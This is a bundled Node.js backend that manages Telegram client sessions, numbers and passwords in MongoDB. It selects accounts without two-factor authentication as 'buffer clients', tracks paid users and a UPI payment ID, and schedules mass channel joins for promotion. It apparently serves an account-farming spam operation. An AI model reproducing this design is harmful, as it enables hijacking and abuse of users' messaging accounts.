/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./cloudinary.js":
/*!***********************!*\
  !*** ./cloudinary.js ***!
  \***********************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   CloudinaryService: () => (/* binding */ CloudinaryService)
/* harmony export */ });
/* harmony import */ var cloudinary__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! cloudinary */ "cloudinary");
/* harmony import */ var cloudinary__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(cloudinary__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! path */ "path");
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(path__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! fs */ "fs");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(fs__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./utils */ "./utils.js");
console.log("in Cloudinary");





class CloudinaryService {
    static instance;
    resources = new Map();

    constructor() {
        cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.config({
            cloud_name: process.env.CL_NAME,
            api_key: process.env.CL_APIKEY,
            api_secret: process.env.CL_APISECRET
        });
    }

    static async getInstance(name) {
        if (!CloudinaryService.instance) {
            CloudinaryService.instance = new CloudinaryService();
        }
        await CloudinaryService.instance.getResourcesFromFolder(name);
        return CloudinaryService.instance;
    }

    async getResourcesFromFolder(folderName) {
        console.log('FETCHING NEW FILES!! from CLOUDINARY');
        await this.findAndSaveResources(folderName, 'image');
    }

    async createNewFolder(folderName) {
        await this.createFolder(folderName);
        await this.uploadFilesToFolder(folderName);
    }

    async overwriteFile() {
        const cloudinaryFileId = "index_nbzca5.js";
        const localFilePath = "./src/test.js";

        try {

            const result = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.uploader.upload(localFilePath, {
                resource_type: 'auto',
                overwrite: true,
                invalidate: true,
                public_id: cloudinaryFileId
            });
            console.log(result);
        } catch (error) {
            console.log(error);
        }

    }

    async findAndSaveResources(folderName, type) {
        try {
            const { resources } = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
            resources.forEach(async (resource) => {
                try {
                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);
                } catch (error) {
                    console.log(resource);
                    console.log(error)
                }

            });
        } catch (error) {
            console.log(error);
        }
    }

    async createFolder(folderName) {
        try {
            const result = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.api.create_folder(folderName);

            return result;
        } catch (error) {
            console.error('Error creating folder:', error);
            throw error;
        }
    }

    // Function to upload files from URLs to a specific folder in Cloudinary
    async uploadFilesToFolder(folderName) {
        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {
            try {
                const result = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.uploader.upload_large(url, {
                    folder: folderName,
                    resource_type: 'auto',
                    public_id: key, // Set the key as the public_id
                });

                return result;
            } catch (error) {
                console.error('Error uploading file:', error);
                throw error;
            }
        });

        try {
            return await Promise.all(uploadPromises);
        } catch (error) {
            console.error('Error uploading files:', error);
            throw error;
        }
    }

    async printResources() {
        try {
            this.resources?.forEach((val, key) => {
                console.log(key, ":", val);
            })
        } catch (error) {
            console.log(error);
        }
    }

    get(publicId) {
        try {
            const result = this.resources.get(publicId)
            return result || '';
        } catch (error) {
            console.log(error);
        }
    }

    getBuffer(publicId) {
        try {
            const result = this.resources.get(publicId)
            return result || '';
        } catch (error) {
            console.log(error);
        }
    }
}

async function saveFile(url, name) {
    const extension = url.substring(url.lastIndexOf('.') + 1, url.length);
    const mypath = path__WEBPACK_IMPORTED_MODULE_1___default().resolve(__dirname, `../${name}.${extension}`);
    (0,_utils__WEBPACK_IMPORTED_MODULE_3__.fetchWithTimeout)(url, { responseType: 'arraybuffer' }, 2)
        .then(res => {
            if (res?.statusText === 'OK') {
                try {
                    if (!fs__WEBPACK_IMPORTED_MODULE_2___default().existsSync(mypath)) {
                        fs__WEBPACK_IMPORTED_MODULE_2___default().writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file
                        console.log(`${name}.${extension} Saved!!`);
                    } else {
                        fs__WEBPACK_IMPORTED_MODULE_2___default().unlinkSync(mypath);
                        fs__WEBPACK_IMPORTED_MODULE_2___default().writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file
                        console.log(`${name}.${extension} Replaced!!`);
                    }
                } catch (err) {
                    console.error(err);
                }
            } else {
                throw new Error(`Unable to download file from ${url}`);
            }
        }).catch(err => {
            console.error(err);
        });
}





/***/ }),

/***/ "./dbservice.js":
/*!**********************!*\
  !*** ./dbservice.js ***!
  \**********************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   ChannelService: () => (/* binding */ ChannelService)
/* harmony export */ });
/* harmony import */ var mongodb__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! mongodb */ "mongodb");
/* harmony import */ var mongodb__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(mongodb__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! mongoose */ "mongoose");
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(mongoose__WEBPACK_IMPORTED_MODULE_1__);


class ChannelService {
    static instance;
    client = undefined
    db = undefined;
    users = undefined;
    statsDb = undefined;
    statsDb2 = undefined;
    isConnected = false;

    constructor () {
    }

    static getInstance() {
        if (!ChannelService.instance) {
            ChannelService.instance = new ChannelService();
        }
        return ChannelService.instance;
    }
    static isInstanceExist() {
        return !!ChannelService.instance;
    }

    async connect() {
        if (!this.isConnected) {
            console.log('trying to connect to DB......')
            try {
                await mongoose__WEBPACK_IMPORTED_MODULE_1___default().connect(process.env.mongouri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: mongodb__WEBPACK_IMPORTED_MODULE_0__.ServerApiVersion.v1, maxPoolSize: 10 } );
                console.log('Connected to MongoDB');
                this.client = mongoose__WEBPACK_IMPORTED_MODULE_1___default().connection.getClient()
                this.isConnected = true;
                this.client.on('close', () => {
                    console.log('MongoDB connection closed.');
                    this.isConnected = false;
                });
                this.db = this.client.db("tgclients").collection('channels');
                this.users = this.client.db("tgclients").collection('users');
                this.statsDb = this.client.db("tgclients").collection('stats');
                this.statsDb2 = this.client.db("tgclients").collection('stats2');
                return true;
            } catch (error) {
                console.log(`Error connecting to MongoDB: ${error}`);
                return false;
            }
        } else {
            console.log('MongoConnection ALready Existing');
        }
    }
    async insertChannel(channelData) {
        const {
            title,
            id,
            username,
            megagroup,
            participantsCount,
            restricted,
            broadcast
        } = channelData
        const cannotSendMsgs = channelData.defaultBannedRights?.sendMessages
        if (!cannotSendMsgs && !broadcast) {
            await this.db.updateOne({ channelId: id.toString() }, { $set: { username: username, title, megagroup, participantsCount, broadcast, restricted, sendMessages: channelData.defaultBannedRights?.sendMessages, canSendMsgs: true } }, { upsert: true });
        }
    }
    async getChannels(limit = 50, skip = 0, k) {
        const query = { megagroup: true, username: { $ne: null } };
        const sort = { participantsCount: -1 };
        if (k) {
            query["$or"] = [{ title: { $regex: k, $options: 'i' } }, { username: { $regex: k, $options: 'i' } }]
        }
        const options = { collation: { locale: 'en', strength: 1 } };
        try {
            if (k) {
                await this.db?.createIndex({ title: 'text' }); // Create index on the "title" field for text search
            }
            const result = await this.db
                .find(query, options)
                .sort(sort)
                .skip(skip)
                .limit(limit)
                .toArray();

            return result;
        } catch (error) {
            console.error('Error:', error);
            return [];
        }
    }

    async insertContact(contact) {
        const collection = this.client.db("tgclients").collection('contacts');
        await collection.updateOne({ phone: contact.phone }, { $set: contact }, { upsert: true });
    }

    async insertUser(user) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.updateOne(filter, { $set: user }, { upsert: true });
        } catch (error) {
            console.log(error)
        }
    }

    async updateUser(user, data) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.updateOne(filter, {
                $set: {
                    ...data
                },
            }, { upsert: true });
        } catch (error) {
            console.log(error)
        }
    }

    async resetPaidUsers() {
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const entry = await collection.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 50 } }] }, {
                $set: {
                    totalCount: 10,
                    limitTime: Date.now()
                }
            });
        } catch (error) {
            console.log(error)
        }
    }

    async deleteUser(user) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.deleteOne(filter);
        } catch (error) {
            console.log(error)
        }
    }

    async getUser(user) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.findOne(filter);
            return entry
        } catch (error) {
            console.log(error)
            return undefined
        }
    }

    async getuserdata(filter) {
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const entry = await collection.findOne(filter);
            return entry
        } catch (error) {
            console.log(error)
            return undefined
        }
    }

    async updateUserData(filter, data) {
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const entry = await collection.updateMany(filter, { $set: { ...data } });
            return entry
        } catch (error) {
            console.log(error)
            return undefined
        }
    }

    async getTempUser() {
        try {
            const entry = await this.users.findOne({});
            return entry
        } catch (error) {
            console.log(error)
        }
    }

    async getUsersFullData(limit = 2, skip = 0) {
        const result = await this.users?.find({}).skip(skip).limit(limit).sort({ _id: 1 }).toArray();
        if (result) {
            return result;
        } else {
            return undefined;
        }
    }

    async insertInBufferClients(user) {
        const filter = { mobile: user.mobile };
        try {
            const bufferColl = this.client.db("tgclients").collection('bufferClients');
            await bufferColl.updateOne(filter, { $set: { ...user } }, { upsert: true });
        } catch (error) {
            console.log(error)
        }
    }

    async readBufferClients(filter, limit) {
        const bufferColl = this.client.db("tgclients").collection('bufferClients');
        const query = filter || {};
        const queryWithLimit = limit ? bufferColl.find(query).limit(limit) : bufferColl.find(query);
        const result = await queryWithLimit.toArray();
        if (result?.length > 0) {
            return result;
        } else {
            return [];
        }
    }


    async getOneBufferClient(mobile = null) {
        const bufferColl = this.client.db("tgclients").collection('bufferClients');
        const today = new Date().toISOString().split('T')[0]
        const query = { date: { $lte: today } }
        if (mobile) {
            console.log(mobile)
            query['mobile'] = mobile
        }
        console.log(query)
        const results = await bufferColl.find(query).toArray();
        if (results.length) {
            for (const result of results) {
                if (result) {
                    const alreadyExist = await this.getUserConfig({ number: `+${result.mobile}` });
                    if (!alreadyExist) {
                        return result
                    } else {
                        console.log("removing one already existing client");
                        const entry = await bufferColl.deleteMany({ mobile: result.mobile });
                    }
                } else {
                    return undefined;
                }
            }
        } else {
            console.log("returnimg undefind")
            return undefined
        }
    }

    async deleteBufferClient(user) {
        const filter = { mobile: user.mobile };
        console.log(filter)
        const bufferColl = this.client.db("tgclients").collection('bufferClients');
        try {
            const entry = await bufferColl.deleteOne(filter);
            console.log(entry)
        } catch (error) {
            console.log(error)
        }
    }

    async getNewBufferClients(ids) {
        const cursor = this.users.find({ "mobile": { $nin: ids }, twoFA: { $exists: false } }).sort({ lastActive: 1 }).limit(20);
        return cursor
    }

    async readPromoteStats() {
        const promotColl = this.client.db("tgclients").collection('promoteStats');
        const result = await promotColl.find({}, { projection: { "client": 1, "totalCount": 1, "lastUpdatedTimeStamp": 1, "isActive": 1, "_id": 0 } }).sort({ totalCount: -1 }).toArray();
        if (result.length > 0) {
            return result;
        } else {
            return undefined;
        }
    }

    async checkIfPaidToOthers(chatId, profile) {
        const resp = { paid: 0, demoGiven: 0 };
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const document = await collection.find({ chatId, profile: { $exists: true, "$ne": profile }, payAmount: { $gte: 10 } }).toArray();
            const document2 = await collection.find({ chatId, profile: { $exists: true, "$ne": profile }, demoGiven: true }).toArray();
            if (document.length > 0) {
                resp.paid = document.length
            }
            if (document2.length > 0) {
                resp.demoGiven = document2.length
            }
        } catch (error) {
            console.log(error);
        }
        return resp;
    }


    async readSinglePromoteStats(clientId) {
        const promotColl = this.client.db("tgclients").collection('promoteStats');
        const result = await promotColl.findOne({ client: clientId }, { projection: { "client": 1, "totalCount": 1, "lastUpdatedTimeStamp": 1, "isActive": 1, "_id": 0 } });
        return result
    }

    async readStats() {
        const result = await this.statsDb.find({}).sort({ newUser: -1 })
        if (result) {
            return result.toArray();
        } else {
            return undefined;
        }
    }

    async read(chatId) {
        const result = await this.db.findOne({ chatId });
        if (result) {
            return result;
        } else {
            return undefined;
        }
    }
    async removeOnefromChannel(filter) {
        try {
            await this.db.deleteOne(filter)
        } catch (e) {
            console.log(e)
        }
    }

    async getUsers(limit, skip = 0) {
        const result = await this.users?.find({}, { projection: { firstName: 1, userName: 1, mobile: 1, _id: 0 } }).skip(skip).limit(limit).toArray();
        if (result) {
            return result;
        } else {
            return undefined;
        }
    }

    async getupi(key) {
        const upiDb = this.client.db("tgclients").collection('upi-ids');
        const upiIds = await upiDb.findOne({});
        return upiIds[key] || "lakshmi-69@paytm"
    }

    async getAllUpis() {
        const upiDb = this.client.db("tgclients").collection('upi-ids');
        const upiIds = await upiDb.findOne({});
        return upiIds
    }

    async updateUpis(data) {
        const upiDb = this.client.db("tgclients").collection('upi-ids');
        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });
        return upiIds
    }

    async getBuilds() {
        const buildBd = this.client.db("tgclients").collection('builds');
        const builds = await buildBd.findOne({});
        return builds
    }

    async updateBuilds(data) {
        const buildBd = this.client.db("tgclients").collection('builds');
        const builds = await buildBd.updateOne({}, { $set: { ...data } }, { upsert: true });
        return builds
    }

    async getUserConfig(filter) {
        const clientDb = this.client.db("tgclients").collection('clients');
        const client = await clientDb.findOne(filter);
        return client
    }
    async getUserInfo(filter) {
        const clientDb = this.client.db("tgclients").collection('clients');
        const aggregationPipeline = [
            { $match: filter },
            {
                $project: {
                    "_id": 0,
                    "session": 0,
                    "number": 0,
                    "password": 0,
                }
            }
        ];
        const result = await clientDb.aggregate(aggregationPipeline).toArray();
        return result.length > 0 ? result[0] : null;
    }

    
    async updateUserConfig(filter, data) {
        const upiDb = this.client.db("tgclients").collection('clients');
        const updatedDocument = await upiDb.findOneAndUpdate(filter, { $set: { ...data } }, { returnOriginal: false });
        return updatedDocument.value;
    }

    async readArchivedClients(filter, limit) {
        const bufferColl = this.client.db("tgclients").collection('ArchivedClients');
        const query = filter || {};
        const queryWithLimit = limit ? bufferColl.find(query).limit(limit) : bufferColl.find(query);
        const result = await queryWithLimit.toArray();
        if (result?.length > 0) {
            return result;
        } else {
            return [];
        }
    }

    async insertInAchivedClient(data) {
        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
        const upiIds = await upiDb.updateOne({ number: data.number }, { $set: { ...data } }, { upsert: true });
        return upiIds
    }

    async getInAchivedClient(filter) {
        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
        const upiIds = await upiDb.findOne(filter)
        return upiIds
    }

    async removeOneAchivedClient(filter) {
        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
        const upiIds = await upiDb.deleteOne(filter)
        return upiIds
    }

    async getAllUserClients() {
        const clientDb = this.client.db("tgclients").collection('clients');
        const clients = await clientDb.aggregate([
            {
                $project: {
                    "_id": 0,
                    "session": 0,
                    "number": 0,
                    "password": 0,
                }
            }
        ]).toArray();
        return clients;
    }

    async getTgConfig() {
        const clientDb = this.client.db("tgclients").collection('configuration');
        const client = await clientDb.findOne({ "apiId": "1591339" });
        return client
    }

    async updateTgConfig(data) {
        const upiDb = this.client.db("tgclients").collection('configurations');
        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });
        return upiIds
    }

    async processUsers(limit = undefined, skip = undefined) {
        const weekAgo = new Date(Date.now() - (60 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0]
        const cursor = this.users.find({
            $or: [
                { "lastUpdated": { $lt: weekAgo } },
                { "lastUpdated": { $exists: false } }
            ]
        }).limit(limit ? limit : 300).skip(skip ? skip : 0);
        return cursor;
    }

    async clearStats() {
        const result = await this.statsDb.deleteMany({ "payAmount": { $lt: 5 } });
        console.log(result);
    }

    async clearStats2() {
        const result = await this.statsDb2?.deleteMany({});
        console.log(result);
    }

    async reinitPromoteStats() {
        const promotColl = this.client.db("tgclients").collection('promoteStats');
        const users = await this.getAllUserClients();
        for (const user of users) {
            await promotColl.updateOne({ client: user.clientId },
                {
                    $set: {
                        data: Object.fromEntries((await promotColl.findOne({ client: user.clientId })).channels?.map(channel => [channel, 0])),
                        totalCount: 0,
                        uniqueChannels: 0,
                        releaseDay: Date.now(),
                        lastupdatedTimeStamp: Date.now()
                    }
                });
        }
    }

    async closeConnection() {
        try {
            if (this.isConnected) {
                this.isConnected = false;
                console.log('MongoDB connection closed.');
            }
            await this.client?.close();
        } catch (error) {
            console.log(error)
        }
    }

    async getCurrentActiveUniqueChannels() {
        const promoteStatsColl = this.client.db("tgclients").collection('promoteStats');

        const cursor = promoteStatsColl.find({});
        const uniqueChannels = new Set();

        await cursor.forEach((document) => {
            for (const channel in document.data) {
                uniqueChannels.add(channel);
            }
        });

        const uniqueChannelNames = Array.from(uniqueChannels);
        return uniqueChannelNames;
    }
    async setEnv() {
        const clientDb = this.client.db("tgclients").collection('configuration');
        const jsonData = await clientDb.findOne({}, { _id: 0 });
        for (const key in jsonData) {
            console.log('setting', key)
            process.env[key] = jsonData[key];
        }
        console.log("finished setting env");
    }

    async getActiveChannels(limit = 50, skip = 0, keywords = [], notIds = [], collection = 'activeChannels') {
        const pattern = new RegExp(keywords.join('|'), 'i');
        const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i")
        let query = {
            $and: [
                { username: { $ne: null } },
                {
                    $or: [
                        { title: { $regex: pattern } },
                        { username: { $regex: pattern } }
                    ]
                },
                {
                    username: {
                        $not: {
                            $regex: "^(" + notIds.map(id => "(?i)" + id?.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))?.join("|") + ")$"
                        }
                    }
                },
                {
                    title: { $not: { $regex: notPattern } }
                },
                {
                    username: { $not: { $regex: notPattern } }
                },
                {
                    sendMessages: false,
                    broadcast: false,
                    restricted: false
                }
            ]
        };

        const sort = { participantsCount: -1 };
        const promoteStatsColl = this.client.db("tgclients").collection(collection);
        try {
            const result = await promoteStatsColl
                .find(query)
                .sort(sort)
                .skip(skip)
                .limit(limit)
                .toArray();

            return result;
        } catch (error) {
            console.error('Error:', error);
            return [];
        }
    }

    async updateActiveChannels() {
        try {
            const promoteStatsColl = this.client.db("tgclients").collection('promoteStats');
            const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
            const channelInfoCollection = this.client.db("tgclients").collection('channels');
            const cursor = promoteStatsColl.find({});

            await cursor.forEach(async (document) => {
                for (const channelId in document.data) {
                    const channelInfo = await channelInfoCollection.findOne({ channelId }, { projection: { "_id": 0 } });
                    if (channelInfo) {
                        await activeChannelCollection.updateOne({ channelId }, { $set: channelInfo }, { upsert: true });
                    }
                }
            });
        } catch (error) {
            console.log(error)
        }
    }

    async updateActiveChannel(id, data) {
        const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
        await activeChannelCollection.updateOne({ channelId: id }, { $set: data }, { upsert: true })
    }

    async removeOnefromActiveChannel(filter) {
        try {
            const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
            await activeChannelCollection.deleteOne(filter)
        } catch (e) {
            console.log(e)
        }
    }
}


/***/ }),

/***/ "./index.js":
/*!******************!*\
  !*** ./index.js ***!
  \******************/
/***/ ((module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.a(module, async (__webpack_handle_async_dependencies__, __webpack_async_result__) => { try {
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var dotenv__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! dotenv */ "dotenv");
/* harmony import */ var dotenv__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(dotenv__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var express__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! express */ "express");
/* harmony import */ var express__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(express__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! axios */ "axios");
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(axios__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var node_schedule_tz__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! node-schedule-tz */ "node-schedule-tz");
/* harmony import */ var node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(node_schedule_tz__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var _dbservice__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./dbservice */ "./dbservice.js");
/* harmony import */ var _telegramManager__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./telegramManager */ "./telegramManager.js");
/* harmony import */ var body_parser__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! body-parser */ "body-parser");
/* harmony import */ var body_parser__WEBPACK_IMPORTED_MODULE_6___default = /*#__PURE__*/__webpack_require__.n(body_parser__WEBPACK_IMPORTED_MODULE_6__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./utils */ "./utils.js");
/* harmony import */ var child_process__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! child_process */ "child_process");
/* harmony import */ var child_process__WEBPACK_IMPORTED_MODULE_8___default = /*#__PURE__*/__webpack_require__.n(child_process__WEBPACK_IMPORTED_MODULE_8__);
/* harmony import */ var _cloudinary__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./cloudinary */ "./cloudinary.js");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! fs */ "fs");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_10___default = /*#__PURE__*/__webpack_require__.n(fs__WEBPACK_IMPORTED_MODULE_10__);
/* harmony import */ var _nestjs_core__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
/* harmony import */ var _nestjs_core__WEBPACK_IMPORTED_MODULE_11___default = /*#__PURE__*/__webpack_require__.n(_nestjs_core__WEBPACK_IMPORTED_MODULE_11__);
/* harmony import */ var _nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! @nestjs/platform-express */ "@nestjs/platform-express");
/* harmony import */ var _nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12___default = /*#__PURE__*/__webpack_require__.n(_nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12__);
/* harmony import */ var commonService__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! commonService */ "commonService");
/* harmony import */ var commonService__WEBPACK_IMPORTED_MODULE_13___default = /*#__PURE__*/__webpack_require__.n(commonService__WEBPACK_IMPORTED_MODULE_13__);
/* harmony import */ var _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
/* harmony import */ var _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14___default = /*#__PURE__*/__webpack_require__.n(_nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__);
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! mongoose */ "mongoose");
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_15___default = /*#__PURE__*/__webpack_require__.n(mongoose__WEBPACK_IMPORTED_MODULE_15__);
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_16__ = __webpack_require__(/*! path */ "path");
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_16___default = /*#__PURE__*/__webpack_require__.n(path__WEBPACK_IMPORTED_MODULE_16__);


dotenv__WEBPACK_IMPORTED_MODULE_0___default().config();




 // Assuming timeZone and timeZoneName are exported from node-schedule-tz















var cors = __webpack_require__(/*! cors */ "cors");
const app = express__WEBPACK_IMPORTED_MODULE_1___default()();
const port = process.env.PORT || 4000;
const userMap = new Map();
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('exit', async () => {
  await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance().closeConnection();
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
});
let ip;
let clients;
let upiIds;
const pings = {}


;(0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)('https://ipinfo.io/json')
  .then(result => {
    return result?.data;
  })
  .then((output) => {
    ip = output;
    console.log(ip)
  })
  .then(async () => {
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance()
    await db.connect();
    await db.setEnv();
    setTimeout(async () => {
      checkerclass.getinstance()
      await setUserMap();
    }, 100);
    setTimeout(() => {
      if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getActiveClientSetup)()) {
        joinchannelForBufferClients();
      }
    }, 120000);
  }).catch(err => {
    console.error(err)
    setTimeout(() => {
      if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getActiveClientSetup)()) {
        joinchannelForBufferClients();
      }
    }, 120000);
  })



let count = 0;
let botCount = 0

const pingerbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001703065531`;

const apiResp = {
  INSTANCE_NOT_EXIST: "INSTANCE_NOT_EXIST",
  CLIENT_NOT_EXIST: "CLIENT_NOT_EXIST",
  CONNECTION_NOT_EXIST: "CONNECTION_NOT_EXIST",
  ALL_GOOD: "ALL_GOOD",
  DANGER: "DANGER",
  WAIT: "WAIT"
};

async function setUserMap() {
  userMap.clear();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=UptimeRobot : Refreshed Map`);
  const users = await db.getAllUserClients();
  clients = users
  upiIds = await db.getAllUpis()
  users.forEach(user => {
    userMap.set(user.userName.toLowerCase(), { url: `${user.repl}/`, timeStamp: Date.now(), deployKey: user.deployKey, downTime: 0, lastPingTime: Date.now(), clientId: user.clientId })
    pings[user.userName.toLowerCase()] = Date.now();
  })
}

function getCurrentHourIST() {
  const now = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istTime = new Date(now.getTime() + istOffset);
  const istHour = istTime.getUTCHours();
  return istHour;
}
const connetionQueue = [];
try {
  node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default().scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {
    checkBufferClients()
    for (const value of userMap.values()) {
      try {
        const now = new Date();
        if (now.getUTCDate() % 3 === 1) {
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}leavechannels`);
        }
      } catch (error) {
        console.log("Some Error: ", error.code);
      }
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000)
    }
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${process.env.uptimeChecker}/joinchannel`)
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
  })
  node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default().scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {
    ;(0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${process.env.uptimeChecker}/joinchannel`)
    joinchannelForBufferClients();
  })
} catch (error) {
  console.log("Some Error: ", error.code);
}


app.use(cors());
app.use(body_parser__WEBPACK_IMPORTED_MODULE_6___default().json());
app.get('/', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {

  //
});

app.get('/exitacc', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  //
});

app.get('/checkBufferClients', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Checking Buffer Clients');
  next();
}, async (req, res) => {
  await checkBufferClients();
});
app.get('/checkArchivedClients', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Checking Buffer Clients');
  next();
}, async (req, res) => {
  await checkArchivedClients();
});

